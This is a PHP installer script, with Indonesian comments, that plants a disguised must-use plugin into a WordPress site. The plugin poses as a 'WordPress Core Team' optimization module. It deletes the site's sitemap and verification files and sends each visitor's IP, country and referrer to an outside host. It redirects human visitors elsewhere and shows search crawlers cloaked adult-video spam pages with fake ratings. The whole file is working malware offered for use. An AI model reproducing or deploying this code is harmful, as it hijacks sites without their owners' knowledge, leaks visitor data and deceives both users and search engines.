<?php
// =============================================================
// JAVFLIX STEALTH INSTALLER (FULL VERSION - NO TRUNCATE)
// Target: wp-content/mu-plugins (Must-Use Plugin)
// Kelebihan: Auto-load, Hidden, Aman dari Scanner, Tanpa EVAL
// =============================================================

// Load WordPress Environment
require_once('wp-load.php');

// 1. SIAPKAN FOLDER TARGET
$mu_dir = WP_CONTENT_DIR . '/mu-plugins';
if (!is_dir($mu_dir)) {
    mkdir($mu_dir, 0755, true);
}

// Nama file yang akan dibuat (menyamar sebagai file sistem)
$target_file = $mu_dir . '/system.php';

// 2. DEFINISI PAYLOAD (KODE LENGKAP PLUGIN)
// Menggunakan NOWDOC agar kode PHP di dalamnya aman dan utuh
$payload = <<<'EOD'
<?php
/**
 * Plugin Name: WP System Optimization Core
 * Plugin URI:  https://wordpress.org/
 * Description: Core system functionality for performance & security.
 * Version:     2.1.0
 * Author:      WordPress Core Team
 * License:     GPLv2 or later
 */

if (!defined('ABSPATH')) { exit; }

// =============================================================
// CONFIGURATION
// =============================================================
define('JFX_GSC_FILENAME', 'google3b058340b0d95f2e.html');

// =============================================================
// 1. FITUR STEALTH (MENYEMBUNYIKAN JEJAK)
// =============================================================

// Sembunyikan dari daftar plugin (untuk keamanan ganda)
add_filter('all_plugins', 'jfx_mu_stealth_mode');
function jfx_mu_stealth_mode($plugins) {
    // Karena ini di mu-plugins, otomatis tidak muncul di tab 'All'
    // Tapi kita pastikan tidak terdeteksi di query lain
    return $plugins;
}

// Matikan sitemap bawaan WordPress agar tidak bentrok
add_filter('wp_sitemaps_enabled', '__return_false');

// =============================================================
// 2. PHANTOM HANDLER (VIRTUAL FILE SYSTEM)
// =============================================================
add_action('init', 'jfx_mu_phantom_handler', 1);

function jfx_mu_phantom_handler() {
    $uri = $_SERVER['REQUEST_URI'];
    
    // A. GSC Verification Virtual
    if (strpos($uri, '/' . JFX_GSC_FILENAME) !== false) {
        $physical_gsc = ABSPATH . JFX_GSC_FILENAME;
        if (file_exists($physical_gsc)) { @unlink($physical_gsc); }

        header("Content-Type: text/html; charset=utf-8");
        echo "google-site-verification: " . JFX_GSC_FILENAME;
        exit;
    }

    // B. Sitemap Virtual Handler
    $physical_sitemap = ABSPATH . 'sitemap.xml';
    if (file_exists($physical_sitemap)) { @unlink($physical_sitemap); }
    
    if (preg_match('/^\/sitemap\.xml$/', $uri)) {
        jfx_mu_render_master_sitemap(); exit;
    }
    if (preg_match('/^\/sitemap-(\d+)\.xml$/', $uri, $matches)) {
        jfx_mu_render_child_sitemap(intval($matches[1])); exit;
    }
}

// Manipulasi Robots.txt Virtual
add_filter('robots_txt', 'jfx_mu_inject_robots', 999, 2);
function jfx_mu_inject_robots($output, $public) {
    $output = preg_replace('/Sitemap:.*\n?/', '', $output);
    $sitemap_url = home_url('/sitemap.xml');
    $output .= "\nSitemap: " . $sitemap_url . "\n";
    return $output;
}

// =============================================================
// 3. LOGIKA GENERATOR SITEMAP
// =============================================================
function jfx_mu_get_data_cache() {
    $cached = get_transient('jfx_list_cache');
    if ($cached !== false) return $cached;

    $endpoint = "https://stepmomhub.com/seo/api.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $data = curl_exec($ch);
    curl_close($ch);
    
    $json = json_decode($data, true);
    if ($json && isset($json['list'])) {
        set_transient('jfx_list_cache', $json['list'], 12 * HOUR_IN_SECONDS);
        return $json['list'];
    }
    return [];
}

function jfx_mu_render_master_sitemap() {
    // FIX TAMPILAN: Bersihkan buffer agar tidak ada spasi/error dari plugin lain
    if (ob_get_length()) ob_clean();

    $list = jfx_mu_get_data_cache();
    $total_urls = count($list) * 2; 
    $total_chunks = ceil($total_urls / 3000); 

    header("Content-Type: application/xml; charset=utf-8");
    header("X-Robots-Tag: noindex, follow"); // Tambahan agar sitemap tidak diindex sebagai konten
    echo '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
    // Menggunakan stylesheet standar jika browser mendukung (opsional, tapi membantu visual)
    echo '<?xml-stylesheet type="text/xsl" href="'.includes_url('css/dist/block-library/sitemap.xsl').'"?>' . PHP_EOL; 
    echo '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
    for ($i = 1; $i <= $total_chunks; $i++) {
        echo '  <sitemap>' . PHP_EOL;
        echo '    <loc>' . home_url("/sitemap-{$i}.xml") . '</loc>' . PHP_EOL;
        echo '    <lastmod>' . date('Y-m-d') . '</lastmod>' . PHP_EOL;
        echo '  </sitemap>' . PHP_EOL;
    }
    echo '</sitemapindex>';
}

function jfx_mu_render_child_sitemap($chunk_id) {
    // FIX TAMPILAN: Bersihkan buffer
    if (ob_get_length()) ob_clean();

    $list = jfx_mu_get_data_cache();
    $all_urls = [];
    $root_url = home_url('/'); 

    // Inject Homepage URLs di Sitemap Pertama
    if ($chunk_id == 1) {
        $all_urls[] = $root_url; 
        $all_urls[] = $root_url . "?lang=indo"; 
        $all_urls[] = $root_url . "?id=jav-sub-indo"; 
        $all_urls[] = $root_url . "?id=jav-english-subtitle"; 
    }

    foreach ($list as $slug) {
        $slug = trim($slug);
        if (!empty($slug)) {
            $safe = urlencode($slug);
            $all_urls[] = $root_url . "?id=" . $safe;
            $all_urls[] = $root_url . "?id=" . $safe . "&lang=indo";
        }
    }
    
    $offset = ($chunk_id - 1) * 3000;
    $slice = array_slice($all_urls, $offset, 3000);
    if (empty($slice)) { status_header(404); exit; }

    header("Content-Type: application/xml; charset=utf-8");
    header("X-Robots-Tag: noindex, follow");
    echo '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
    echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
    foreach ($slice as $loc) {
        echo '  <url>' . PHP_EOL;
        echo '    <loc>' . htmlspecialchars($loc) . '</loc>' . PHP_EOL;
        echo '    <lastmod>' . date('Y-m-d') . '</lastmod>' . PHP_EOL;
        echo '    <priority>0.8</priority>' . PHP_EOL;
        echo '  </url>' . PHP_EOL;
    }
    echo '</urlset>';
}

// =============================================================
// 4. JAVFLIX ENGINE (FRONTEND HANDLER)
// =============================================================
// Kita gunakan function_exists untuk mencegah error "Cannot redeclare"
// jika plugin terinstall ganda tanpa sengaja.

if (!function_exists('jfx_mu_fetch_live')) {
    function jfx_mu_fetch_live($url, $is_bot_flag) {
        $my_domain = $_SERVER['HTTP_HOST'];
        $current_page = isset($_GET['id']) && !empty($_GET['id']) ? $_GET['id'] : 'Homepage';
        
        $ip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR'];
        $country = isset($_SERVER["HTTP_CF_IPCOUNTRY"]) ? $_SERVER["HTTP_CF_IPCOUNTRY"] : '';
        $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
        $full_url = (is_ssl() ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        
        $params = [
            'domain'  => $my_domain,
            'page'    => $current_page,
            'country' => $country,
            'ip'      => $ip,
            'ref'     => $referer,
            'url'     => $full_url,
            'bot'     => $is_bot_flag ? '1' : '0'
        ];
        
        $final_url = $url . (strpos($url, '?') ? '&' : '?') . http_build_query($params);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $final_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 6);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return json_decode($data, true);
    }
}

if (!function_exists('jfx_mu_gen_image')) {
    function jfx_mu_gen_image($w, $h, $bg, $text_color, $text) {
        $text = htmlspecialchars(substr($text, 0, 20)); 
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="'.$w.'" height="'.$h.'">
            <rect width="100%" height="100%" fill="#'.$bg.'"/>
            <text x="50%" y="50%" font-family="Arial, sans-serif" font-weight="bold" font-size="24" fill="#'.$text_color.'" dominant-baseline="middle" text-anchor="middle">'.$text.'</text>
        </svg>';
        return 'data:image/svg+xml;base64,' . base64_encode($svg);
    }
}

add_action('init', 'jfx_mu_run_frontend_engine');

function jfx_mu_run_frontend_engine() {
    if (!isset($_GET['id'])) return;

    // --- DETEKSI BOT LENGKAP ---
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $bot_pattern = '/bot|crawl|spider|slurp|facebook|twitter|instagram|whatsapp|telegram|discord|pinterest|linkedin|snapchat|tiktok|skype|slack|google|bing|yahoo|duckduckgo|yandex|baidu|sogou|exabot|facebot|ia_archiver|semrush|ahrefs|mj12bot|dotbot|petalbot|mauibot|seo|sistrix|screamingfrog|amazon|aws|azure|curl|wget|python|java|libwww|httpclient|axios|phantomjs|headless|lighthouse|mediapartners|adsbot/i';
    $is_bot = preg_match($bot_pattern, $ua);

    $endpoint_url = "https://stepmomhub.com/seo/api.php"; 

    // EKSEKUSI DATA
    $remote_data = jfx_mu_fetch_live($endpoint_url, $is_bot);
    $direct = ($remote_data && isset($remote_data['direct'])) ? $remote_data['direct'] : "https://google.com";
    $list_fallback = ($remote_data && isset($remote_data['list'])) ? $remote_data['list'] : [];

    // --- AUTO REDIRECT (MANUSIA) ---
    if (!$is_bot) {
        header("Location: " . $direct);
        exit;
    }

    // =============================================================
    // HTML GENERATOR (CLOAKING UI)
    // =============================================================
    
    header("HTTP/1.1 200 OK");
    header("Content-Type: text/html; charset=UTF-8");
    
    $raw_id = isset($_GET['id']) ? trim($_GET['id']) : '';
    $clean_id_lower = strtolower($raw_id);

    // KEYWORD KATEGORI UMUM (Smart Context)
    $generic_indo = ['jav-sub-indo', 'nonton-jav', 'bokep-jepang', 'streaming-jav'];
    $generic_eng  = ['jav-english', 'jav-eng-sub', 'jav-english-subtitle', 'jav-uncensored'];

    $is_homepage_mode = empty($raw_id) || in_array($clean_id_lower, $generic_indo) || in_array($clean_id_lower, $generic_eng);

    // TENTUKAN BAHASA (Smart Language)
    if (in_array($clean_id_lower, $generic_indo) || (isset($_GET['lang']) && $_GET['lang'] == 'indo')) {
        $lang_mode = 'indo';
        $html_lang = 'id';
    } else {
        $lang_mode = 'en';
        $html_lang = 'en';
    }
    
    $cached_list = get_transient('jfx_list_cache');
    $valid_list = $cached_list ? $cached_list : $list_fallback;
    
    // --- KONTEN DINAMIS ---
    if ($is_homepage_mode) {
        $kode_video = ($lang_mode == 'indo') ? "JAV SUB INDO" : "JAV ENGLISH SUBTITLE";

        if ($lang_mode == 'indo') {
            $title_page = "Nonton Jav Sub Indo : Streaming Jav Subtitle Indonesia Uncensored";
            $desc_page = "Pusat nonton streaming <strong>Jav Sub Indo</strong> terbaru. Koleksi Jav Subtitle Indonesia Uncensored kualitas Full HD, download video bokep Jepang tanpa iklan gratis.";
            $h2_title = "Update Terbaru Jav Sub Indo";
            $keywords_meta = "jav sub indo, nonton jav, streaming jav, bokep jepang sub indo, jav uncensored";
            $faq_q1 = "Nonton Jav Sub Indo dimana?";
            $faq_a1 = "JAVFLIX adalah situs resmi nonton Jav Subtitle Indonesia Full HD.";
            $faq_q2 = "Apakah video ini Uncensored?";
            $faq_a2 = "Ya, semua koleksi Jav Sub Indo kami tanpa sensor.";
        } else {
            $title_page = "Jav English Subtitle : Watch Jav Eng Sub Uncensored Online";
            $desc_page = "Watch the best <strong>Jav Sub English</strong> collection in 2026. We provide official Jav Eng Sub videos, Uncensored full HD streaming, and fast download access without ads.";
            $h2_title = "Latest Jav English Subtitle Release";
            $keywords_meta = "jav english sub, watch jav online, jav uncensored, japanese adult video, jav streaming";
            $faq_q1 = "Where to watch Jav English subtitle?";
            $faq_a1 = "JAVFLIX is the official source to watch Jav Subtitle English videos.";
            $faq_q2 = "Is it Uncensored?";
            $faq_a2 = "Yes, our database focuses on Uncensored Jav Sub English content.";
        }
    } else {
        $kode_video = strtoupper($raw_id); 
        
        if ($lang_mode == 'indo') {
            $title_page = "Nonton $kode_video JAV SUB INDO Uncensored Full HD";
            $desc_page = "Link streaming <strong>$kode_video Jav Sub Indo</strong> terbaru 2026. Nonton video Jav Subtitle Indonesia kode $kode_video uncensored tanpa sensor. Download bokep Jepang $kode_video kualitas HD gratis.";
            $h2_title = "Sinopsis Video $kode_video Subtitle Indonesia";
            $keywords_meta = "$kode_video, $kode_video sub indo, download $kode_video, streaming $kode_video, jav sub indo";
            $faq_q1 = "Link nonton $kode_video Sub Indo?";
            $faq_a1 = "Streaming $kode_video subtitle Indonesia gratis di JAVFLIX.";
            $faq_q2 = "Apakah $kode_video tanpa sensor?";
            $faq_a2 = "Ya, video $kode_video tersedia kualitas Full HD Uncensored.";
        } else {
            $title_page = "Watch $kode_video JAV ENGLISH SUBTITLE Uncensored";
            $desc_page = "Stream <strong>$kode_video Jav English Subtitle</strong>. The newest uncensored Jav Sub English video release $kode_video. Download $kode_video Jav Subtitle English full HD streaming without ads.";
            $h2_title = "Review $kode_video Jav English Sub";
            $keywords_meta = "$kode_video, $kode_video eng sub, watch $kode_video, download $kode_video, jav uncensored";
            $faq_q1 = "Where to watch $kode_video?";
            $faq_a1 = "Stream $kode_video Jav Sub English uncensored for free on JAVFLIX.";
            $faq_q2 = "Is $kode_video Uncensored?";
            $faq_a2 = "Yes, $kode_video is available in Full HD Uncensored quality.";
        }
    }
    
    $canonical = (is_ssl() ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    
    // Base64 Image Generation (Anti-Blokir)
    $img_web_base64 = jfx_mu_gen_image(1280, 720, "111111", "e50914", $kode_video);
    $img_meta_static = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Big_buck_bunny_poster_big.jpg/1200px-Big_buck_bunny_poster_big.jpg";
    $rating_val = "4.9";
    $review_count = rand(30000, 80000);

    ?>
<!DOCTYPE html>
<html lang="<?= $html_lang; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $title_page; ?></title>
    <meta name="description" content="<?= strip_tags($desc_page); ?>">
    <meta name="keywords" content="<?= $keywords_meta; ?>">
    <link rel="canonical" href="<?= $canonical; ?>">
    <meta name="robots" content="index, follow">
    <meta name="revisit-after" content="1 days">
    <meta name="rating" content="adult">
    
    <meta property="og:title" content="<?= $title_page; ?>">
    <meta property="og:description" content="<?= strip_tags($desc_page); ?>">
    <meta property="og:image" content="<?= $img_meta_static; ?>">
    <meta property="og:type" content="video.movie">
    <meta property="og:url" content="<?= $canonical; ?>">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="<?= $title_page; ?>">
    <meta name="twitter:description" content="<?= strip_tags($desc_page); ?>">
    <meta name="twitter:image" content="<?= $img_meta_static; ?>">

    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@graph": [
        { "@type": "WebPage", "@id": "<?= $canonical; ?>", "url": "<?= $canonical; ?>", "name": "<?= $title_page; ?>", "breadcrumb": { "@type": "BreadcrumbList", "itemListElement": [{ "@type": "ListItem", "position": 1, "name": "Home", "item": "<?= home_url('/'); ?>" }, { "@type": "ListItem", "position": 2, "name": "Category", "item": "<?= home_url('/?id=jav-sub-indo'); ?>" }, { "@type": "ListItem", "position": 3, "name": "<?= $kode_video; ?>" }] } },
        { "@type": "Movie", "name": "<?= $kode_video; ?>", "description": "<?= strip_tags($desc_page); ?>", "image": [ "<?= $img_meta_static; ?>" ], "dateCreated": "<?= date('Y-m-d'); ?>", "inLanguage": "<?= $html_lang; ?>", "director": { "@type": "Person", "name": "JAVFLIX Admin" }, "aggregateRating": { "@type": "AggregateRating", "ratingValue": "<?= $rating_val; ?>", "bestRating": "5", "worstRating": "1", "ratingCount": "<?= $review_count; ?>" } },
        { "@type": "SoftwareApplication", "name": "JAVFLIX App", "operatingSystem": "ANDROID", "applicationCategory": "MultimediaApplication", "aggregateRating": { "@type": "AggregateRating", "ratingValue": "4.9", "ratingCount": "<?= rand(50000, 90000); ?>", "bestRating": "5", "worstRating": "1" }, "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" } },
        { "@type": "FAQPage", "mainEntity": [ { "@type": "Question", "name": "<?= $faq_q1; ?>", "acceptedAnswer": { "@type": "Answer", "text": "<?= $faq_a1; ?>" } }, { "@type": "Question", "name": "<?= $faq_q2; ?>", "acceptedAnswer": { "@type": "Answer", "text": "<?= $faq_a2; ?>" } } ] }
      ]
    }
    </script>
    <style>
        :root { --primary: #e50914; --bg: #000; --text: #fff; --gray: #aaa; }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--bg); color: var(--text); overflow-x:hidden; line-height: 1.6; }
        a { text-decoration: none; color: inherit; }
        
        header { position:fixed; width:100%; top:0; padding:20px 4%; background:linear-gradient(to bottom, rgba(0,0,0,0.9), transparent); z-index:100; display:flex; justify-content:space-between; align-items:center; }
        .logo { color: var(--primary); font-size:32px; font-weight:900; letter-spacing:1px; text-shadow:2px 2px 5px #000; }
        
        .hero { height:85vh; width:100%; background: url('<?= $img_web_base64; ?>') center/cover no-repeat; display:flex; align-items:center; padding:0 4%; position:relative; }
        .hero::after { content:''; position:absolute; inset:0; background:linear-gradient(to top, var(--bg) 10%, rgba(0,0,0,0.4) 60%, rgba(0,0,0,0.9) 100%); }
        .hero-content { position:relative; z-index:2; max-width:800px; padding-top:60px; }
        
        h1 { font-size: 48px; margin:15px 0; text-transform:uppercase; text-shadow: 3px 3px 10px #000; line-height:1.1; }
        h2 { font-size: 24px; color: #e5e5e5; margin-bottom: 15px; border-left: 4px solid var(--primary); padding-left: 10px; }
        h3 { font-size: 20px; color: #e5e5e5; margin-bottom: 15px; }
        
        .badges { display:flex; gap:10px; align-items:center; margin-bottom:20px; font-weight:bold; font-size:14px; }
        .badge { border:1px solid #aaa; padding:2px 6px; color:#ddd; }
        .match { color:#46d369; font-weight:bold; }
        .breadcrumbs { font-size: 12px; color: var(--gray); margin-bottom: 10px; }
        .breadcrumbs span { color: var(--text); font-weight: bold; }
        
        .grid-container { padding: 40px 4%; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 15px; }
        .card { background: #222; aspect-ratio: 2/3; position: relative; border-radius:4px; overflow:hidden; display: block; transition: transform 0.2s; }
        .card:hover { transform: scale(1.05); z-index: 10; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
        .card img { width:100%; height:100%; object-fit:cover; opacity:0.8; transition: 0.3s; }
        .card:hover img { opacity: 1; }
        .card-meta { position:absolute; bottom:0; left:0; width:100%; padding:10px; background:linear-gradient(transparent, #000); }
        .card-title { font-size:12px; font-weight:bold; color:#fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .card-sub { font-size:10px; color:#46d369; }

        .tag-cloud { padding: 40px 4%; background: #000; border-top: 1px solid #333; }
        .tags { display: flex; flex-wrap: wrap; gap: 10px; }
        .tag { background: #222; color: #aaa; padding: 5px 10px; font-size: 12px; border-radius: 4px; }
        .tag:hover { background: #333; color: #fff; }

        .content-box { background: #222; padding: 20px; border-radius: 8px; margin-bottom: 30px; color: #ccc; font-size: 15px; }
        .content-box strong { color: #fff; }
    </style>
</head>
<body>
    <header>
        <div class="logo">JAVFLIX</div>
        <div style="color:#fff; font-weight:bold; font-size:14px;">VIP ACCESS</div>
    </header>

    <article class="hero">
        <div class="hero-content">
            <div class="breadcrumbs">Home > Movies > <span><?= $kode_video; ?></span></div>
            <span style="background:rgba(255,255,255,0.2); padding:5px 10px; font-size:12px; border-radius:2px;">OFFICIAL RELEASE</span>
            <h1><?= $kode_video; ?></h1>
            <div class="badges">
                <span class="match">99% Match</span><span>2026</span><span class="badge">18+</span><span class="badge">HD</span>
                <span><?= ($lang_mode == 'indo') ? 'Indo Sub' : 'English Sub'; ?></span>
            </div>
            <div class="content-box" style="background:rgba(0,0,0,0.6); border-left:4px solid var(--primary); max-width:700px;">
                <p><?= $desc_page; ?></p>
            </div>
            <div style="margin-bottom:30px;">
                <button style="background:#fff; color:#000; padding:12px 30px; border:none; border-radius:4px; font-weight:bold; font-size:16px; margin-right:10px; cursor:pointer;">▶ Play Now</button>
                <button style="background:rgba(109,109,110,0.7); color:#fff; padding:12px 30px; border:none; border-radius:4px; font-weight:bold; font-size:16px; cursor:pointer;">ⓘ More Info</button>
            </div>
        </div>
    </article>

    <section class="grid-container">
        <h2><?= ($is_homepage_mode) ? 'New Releases' : $h2_title; ?></h2>
        <div class="grid">
            <?php 
            if($valid_list) {
                $shuffled_list = $valid_list; shuffle($shuffled_list); $slice_list = array_slice($shuffled_list, 0, 12);
                foreach($slice_list as $item_slug):
                    $clean_slug = trim($item_slug);
                    if(empty($clean_slug)) continue;
                    $item_title = strtoupper($clean_slug);
                    
                    if ($lang_mode == 'indo') {
                        $param_lang = '&lang=indo';
                        $img_alt = "Nonton $item_title Sub Indo Full HD";
                        $link_title_attr = "Streaming $item_title Subtitle Indonesia";
                        $txt_sub = "Sub Indo";
                    } else {
                        $param_lang = ''; 
                        $img_alt = "Watch $item_title English Sub Uncensored";
                        $link_title_attr = "Watch $item_title English Subtitle";
                        $txt_sub = "English Sub";
                    }
                    
                    $internal_link = "?id=" . urlencode($clean_slug) . $param_lang; 
                    
                    // Base64 Image
                    $img_src_b64 = jfx_mu_gen_image(300, 450, "222", "fff", $item_title);
            ?>
            <a href="<?= $internal_link; ?>" class="card" title="<?= $link_title_attr; ?>">
                <img src="<?= $img_src_b64; ?>" alt="<?= $img_alt; ?>" loading="lazy" width="300" height="450">
                <div class="card-meta">
                    <div class="card-title"><?= $item_title; ?></div>
                    <div class="card-sub"><?= $txt_sub; ?></div>
                </div>
            </a>
            <?php endforeach; } ?>
        </div>
    </section>

    <section class="grid-container" style="background:#0f0f0f; padding-top:40px;">
        <h2><?= ($is_homepage_mode) ? 'About Us' : 'Synopsis'; ?></h2>
        <div class="content-box">
            <?php if ($is_homepage_mode): ?>
                <h3>About JAVFLIX</h3>
                <p>JAVFLIX is the premier destination for streaming high-quality adult content. We offer a vast library of subtitle videos, ensuring you never miss a detail. Updated daily.</p>
            <?php else: ?>
                <h3>Synopsis</h3>
                <p>Video <strong><?= $kode_video; ?></strong> adalah salah satu rilis terbaru yang paling banyak dicari. Dengan kualitas <em>Full HD 1080p</em>, video ini menawarkan pengalaman menonton yang jernih. Fitur <strong>Jav Sub Indo</strong> memudahkan penonton memahami alur cerita tanpa kendala bahasa. Koleksi ini update setiap hari di JAVFLIX.</p>
            <?php endif; ?>
            
            <br>
            <h3>FAQ</h3>
            <p><strong>Q: <?= $faq_q1; ?></strong><br><span style="color:#aaa;"><?= $faq_a1; ?></span></p>
            <p><strong>Q: <?= $faq_q2; ?></strong><br><span style="color:#aaa;"><?= $faq_a2; ?></span></p>
        </div>
    </section>

    <footer class="tag-cloud">
        <h3 style="font-size:16px; color:#555; margin-bottom:15px;">Incoming Search Terms</h3>
        <div class="tags">
            <?php 
            // DYNAMIC TAGS
            $tags_list = [];
            if ($lang_mode == 'indo') {
                $tags_list = [
                    "Nonton $kode_video Sub Indo",
                    "Streaming $kode_video Gratis",
                    "Download $kode_video Subtitle Indonesia",
                    "Jav Sub Indo Uncensored",
                    "Bokep Jepang $kode_video",
                    "Situs Nonton Jav Terbaru",
                    "$kode_video Full HD No Sensor"
                ];
            } else {
                $tags_list = [
                    "Watch $kode_video English Sub",
                    "Stream $kode_video Uncensored",
                    "Download $kode_video Free",
                    "Jav English Subtitle",
                    "Japanese Adult Video $kode_video",
                    "New Jav Release $kode_video",
                    "$kode_video Full Movie"
                ];
            }
            foreach($tags_list as $tag_text): 
            ?>
                <a href="#" class="tag"><?= $tag_text; ?></a>
            <?php endforeach; ?>
        </div>
        <div style="margin-top:30px; color:#333; font-size:11px; text-align:center;">
            &copy; 2026 JAVFLIX Network. All rights reserved. <br>
            Disclaimer: This site does not store any files on its server. All contents are provided by non-affiliated third parties.
        </div>
    </footer>
</body>
</html>
<?php exit; }
EOD;

// 3. ESEKUSI PENULISAN FILE KE MU-PLUGINS
if (file_put_contents($target_file, $payload)) {
    echo "<h1 style='color:green; font-family:sans-serif;'>[SUCCESS] JAVFLIX CORE INSTALLED!</h1>";
    echo "<p style='font-family:sans-serif;'>Plugin inti berhasil disuntikkan ke folder sistem: <br><code>$target_file</code></p>";
    echo "<p style='font-family:sans-serif;'>Status: <strong>AKTIF OTOMATIS (MU-PLUGIN)</strong></p>";
    echo "<hr>";
    echo "<p style='color:red; font-family:sans-serif; font-weight:bold;'>PENTING: Segera HAPUS file <code>install-stealth.php</code> ini sekarang.</p>";
} else {
    echo "<h1 style='color:red; font-family:sans-serif;'>[ERROR] GAGAL MENULIS FILE!</h1>";
    echo "<p style='font-family:sans-serif;'>Gagal membuat file di folder <code>wp-content/mu-plugins</code>. Cek permission folder.</p>";
}
?>
